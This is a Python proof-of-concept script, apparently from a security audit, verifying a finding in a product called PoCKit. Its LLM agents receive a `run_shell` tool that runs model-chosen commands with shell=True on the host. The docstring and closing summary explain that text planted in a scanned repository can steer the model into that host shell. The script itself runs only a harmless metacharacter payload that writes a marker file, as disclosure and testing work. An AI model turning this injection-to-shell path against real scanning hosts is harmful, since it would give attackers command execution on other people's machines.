"""PoC-F01 (focused): PoCKit hands an LLM agent a host shell - checked three ways.

The finding, in one line: three of PoCKit's agents are registered with
`shell=True`, which adds a `run_shell` tool whose implementation is
`subprocess.run(command, shell=True, cwd=workspace_dir, ...)`. The command
string comes from the model, and the model's context is the repository under
scan, so content that steers the model reaches a shell in the *scanning*
process - the host - not inside the Docker container the prompts talk about.

This script checks the three links of that chain and prints PASS/FAIL for each:

  A. wiring       - which shipped agent modules ask for shell=True
  B. implementation - what run_shell actually calls (from shipped bytecode)
  C. execution    - the shipped tool, registered the way the product registers
                    it, running a shell-metacharacter payload on this host

It executes shipped product code and a shell command (the same harmless
marker-file payload as poc/05). Read it before running it. Run it through the
reconstructed host:

    export PYTHONHOME=<work>/pyhome
    export PYTHONPATH=<work>/merged:<work>/<extract>/base_library.zip
    <work>/py313host poc/14-check-f01.py

Exit codes: 0 = all three links reproduced, 1 = a check failed, 2 = not set up.
"""
import dis
import importlib
import marshal
import os
import pathlib
import sys
import types

AGENT_MODULES = [
    "pockit/agents/environment_setup_agent.pyc",
    "pockit/agents/exploit_agent.pyc",
    "pockit/agents/fix_verification_agent.pyc",
    "pockit/agents/research_agent.pyc",
    "pockit/agents/validate_exploit_agent.pyc",
]
TOOL_MODULE = "pockit/agents/shared_tools.pyc"


# ----------------------------------------------------------------- locate
def find_extract():
    here = os.path.dirname(os.path.abspath(__file__))
    env = os.environ.get("SIGNAL_EXTRACT")
    candidates = []
    if env:
        candidates.append(env)
    candidates += [
        os.path.join(os.getcwd(), "signal-pyarmor-linux-x86_64_extracted"),
        os.path.join(os.path.dirname(here), "signal-pyarmor-linux-x86_64_extracted"),
        "/tmp/vapt/signal-pyarmor-linux-x86_64_extracted",
    ]
    for cand in candidates:
        if os.path.isdir(os.path.join(cand, "PYZ.pyz_extracted")):
            return cand
    return None


# ----------------------------------------------------------- bytecode tools
def load_code(path):
    data = pathlib.Path(path).read_bytes()
    for skip in (16, 0):          # 16-byte .pyc header, or a bare code object
        try:
            return marshal.loads(data[skip:])
        except Exception:
            continue
    raise SystemExit("cannot unmarshal %s" % path)


def walk(code, seen=None):
    if seen is None:
        seen = set()
    if id(code) in seen:
        return
    seen.add(id(code))
    yield code
    for const in code.co_consts:
        if isinstance(const, types.CodeType):
            yield from walk(const, seen)


def call_site(code, funcname):
    """Find the keyword call to `funcname`; return (owner, kwarg-names, consts).

    A call's keyword arguments are named by one tuple constant pushed
    immediately before CALL_KW, so searching for that pair identifies the
    *outer* call and skips nested calls in its arguments (`str(workspace_dir)`
    is a plain CALL, and it is the first thing a naive forward scan hits).
    Values are read from the constants in the argument window; a computed
    argument leaves nothing behind, so the constants are reported in order and
    the raw names/constants are printed rather than silently paired.
    """
    ins = list(dis.get_instructions(code))
    for i, op in enumerate(ins):
        if op.opname in ("LOAD_GLOBAL", "LOAD_NAME") and op.argval == funcname:
            for j in range(i + 1, min(i + 60, len(ins))):
                if ins[j].opname != "CALL_KW":
                    continue
                names = ins[j - 1]
                if names.opname != "LOAD_CONST" or not isinstance(names.argval, tuple):
                    continue
                if (ins[j].arg or 0) < len(names.argval):   # CALL_KW counts positionals too
                    continue
                values = [k.argval for k in ins[i + 1:j - 1]
                          if k.opname == "LOAD_CONST" and not isinstance(k.argval, tuple)]
                yield code.co_name, names.argval, values
                break


def check_wiring(pyz):
    print("== A. wiring: which shipped agents ask for a shell tool ===")
    print("   register_workspace_tools(agent, workspace_dir, source_code_path=None,")
    print("                            shell=False, write=False)")
    print("   (signature read from the shipped module; shell must be opted into)\n")
    shell_agents = []
    for mod in AGENT_MODULES:
        code = load_code(pyz / mod)
        for owner, names, values in [(o, n, v) for c in walk(code)
                                     for (o, n, v) in call_site(c, "register_workspace_tools")]:
            if not names:
                continue
            # At these call sites the constant-valued kwargs come last, so the
            # trailing names pair with the constants in order (printed to check).
            kwargs = dict(zip(names[-len(values):], values)) if values else {}
            bits = []
            if kwargs.get("shell") is True:
                bits.append("shell=True")
            if kwargs.get("write") is True:
                bits.append("write=True")
            print("   %-34s %-12s kwargs=%-42s consts=%s"
                  % (mod.split("/")[-1], owner, names, values))
            print("   %-34s %-12s -> %s" % ("", "",
                                            ", ".join(bits) if bits else "(file tools only)"))
            if kwargs.get("shell") is True:
                shell_agents.append(mod.split("/")[-1])
    print()
    if shell_agents:
        print("   PASS - %d agent(s) register the shell tool: %s"
              % (len(shell_agents), ", ".join(shell_agents)))
        return True
    print("   FAIL - no shipped agent asked for shell=True")
    return False


def check_implementation(pyz):
    print("\n== B. implementation: what run_shell calls ===")
    code = load_code(pyz / TOOL_MODULE)
    target = None
    for c in walk(code):
        if c.co_name == "run_shell":
            target = c
            break
    if target is None:
        print("   FAIL - run_shell not found in %s" % TOOL_MODULE)
        return False
    kwargs, values = None, []
    for _owner, names, consts in call_site(target, "subprocess"):
        if names and "shell" in names:
            kwargs, values = names, consts
    print("   docstring : %s" % (target.co_consts[0] or "").strip())
    print("   arguments : %s" % (target.co_varnames,))
    print("   kwargs    : %s" % (kwargs,))
    print("   constants : %s   (and cwd, computed as str(workspace_dir))" % (values,))
    ok = (bool(kwargs) and "shell" in kwargs and 120 in values
          and sum(1 for v in values if v is True) >= 3)
    if ok:
        print("   call      : subprocess.run(command, shell=True, capture_output=True,")
        print("               text=True, timeout=120, cwd=str(workspace_dir))")
    if ok:
        print("   PASS - shell=True, capture_output/text enabled, timeout 120s,")
        print("          cwd=str(workspace_dir) - a real shell, in the scanner's own process")
        return True
    print("   FAIL - could not confirm shell=True in the disassembly")
    return False


def check_execution(extract, pyz):
    print("\n== C. execution: the shipped tool, on this host ===")
    sys.path.insert(0, extract)
    shared = importlib.import_module("pockit.agents.shared_tools")

    workspace = os.environ.get("POC_WORKSPACE", "/tmp/pockit-f01-workspace")
    os.makedirs(workspace, exist_ok=True)

    class Agent:                       # stand-in for pydantic-ai's Agent
        def __init__(self):
            self.tools = {}

        def tool_plain(self, *a, **k):
            def register(fn):
                self.tools[getattr(fn, "__name__", repr(fn))] = fn
                return fn
            return register(a[0]) if len(a) == 1 and callable(a[0]) else register

    captured = {}

    def profiler(frame, event, _arg):
        if event == "return" and frame.f_code.co_name == "register_workspace_tools":
            captured.update(frame.f_locals)
        return None

    agent = Agent()
    sys.setprofile(profiler)
    try:
        # exactly what exploit_agent/environment_setup_agent do
        shared.register_workspace_tools(agent, workspace, workspace,
                                        shell=True, write=True)
    finally:
        sys.setprofile(None)

    run_shell = captured.get("run_shell") or agent.tools.get("run_shell")
    print("   registered tools: %s" % sorted(agent.tools))
    if run_shell is None:
        print("   FAIL - run_shell was not registered")
        return False

    marker = os.path.join("/tmp", "pockit-f01-%d.proof" % os.getpid())
    if os.path.exists(marker):
        os.unlink(marker)
    payload = ("pwd; echo metachar-proof; echo uid=$(id -u); "
               "printf 'A%s' 'B'; echo $((6*7)); "
               "echo POC > " + marker)
    print("   payload  : %s" % payload)
    out = run_shell(payload)
    print("   --- tool output ---")
    for line in (out or "").splitlines():
        print("   | %s" % line)
    print("   --- end ---")

    checks = {
        "cwd is the workspace": workspace in (out or ""),
        "metacharacters interpreted (; $( ) $(( )) %)": "metachar-proof" in (out or "")
        and "uid=%d" % os.getuid() in (out or "") and "42" in (out or ""),
        "printf format applied": "AB" in (out or ""),
        "file written outside the workspace": os.path.exists(marker),
        "written by this process's uid": os.path.exists(marker)
        and os.stat(marker).st_uid == os.getuid(),
    }
    for name, ok in checks.items():
        print("   %s %s" % ("PASS" if ok else "FAIL", name))
    if os.path.exists(marker):
        os.unlink(marker)
    return all(checks.values())


def main():
    extract = find_extract()
    if not extract:
        print("no extraction found - run poc/00-setup.sh first (see poc/README.md)")
        return 2
    pyz = pathlib.Path(extract) / "PYZ.pyz_extracted"
    print("F-01 focused check - PoCKit + LLM agent + host shell")
    print("extraction: %s\n" % extract)

    results = [
        check_wiring(pyz),
        check_implementation(pyz),
    ]
    try:
        results.append(check_execution(extract, pyz))
    except Exception as exc:                                  # noqa: BLE001
        print("   FAIL - execution check raised %s: %s" % (type(exc).__name__, exc))
        results.append(False)

    print("\n== summary ==")
    for label, ok in zip(("wiring", "implementation", "execution"), results):
        print("   %s %s" % ("PASS" if ok else "FAIL", label))
    print("   F-01 reproduced: %d/3" % sum(1 for r in results if r))
    print("""
   What this shows: the shipped code hands a shell tool to three PoCKit agents,
   and that tool executes attacker-shaped command strings on the host with shell
   semantics - no container boundary is crossed because no container is used.
   What it does not show: a live model choosing the command. The command string
   is model output, and the model's context is the scanned repository, so the
   injection link is the standard LLM01 threat model, not a separate defect.""")
    return 0 if all(results) else 1


if __name__ == "__main__":
    raise SystemExit(main())
